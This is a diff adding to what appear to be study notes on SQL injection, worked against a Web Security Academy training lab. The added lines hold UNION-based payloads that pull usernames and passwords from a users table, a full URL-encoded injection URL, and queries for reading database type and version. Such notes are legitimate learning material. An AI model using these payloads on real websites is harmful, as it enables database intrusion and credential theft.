@@ -105,3 +105,29 @@ This example is for Oracle DBs:
 
 `' UNION SELECT username || '~' || password FROM users--`
 
+Tip: use the comma to combine two queries&#x20;
+
+Regular:
+
+`https://ac791f681f4f06c8c0f90ed300ca0036.web-security-academy.net/filter?category=Gifts`
+
+Modified:
+
+`https://ac791f681f4f06c8c0f90ed300ca0036.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20NULL,username%20||%20%27~%27%20||%20password%20FROM%20users--`
+
+### Querying the database type and version <a href="querying-the-database-type-and-version" id="querying-the-database-type-and-version"></a>
+
+| Database Type    | Query                     |
+| ---------------- | ------------------------- |
+| Microsoft, MySQL | `SELECT @@version`        |
+| Oracle           | `SELECT * FROM v$version` |
+| PostgreSQL       | `SELECT version()`        |
+
+For example, you could use a `UNION` attack with the following input:
+
+`' UNION SELECT @@version--`
+
+
+
+
+
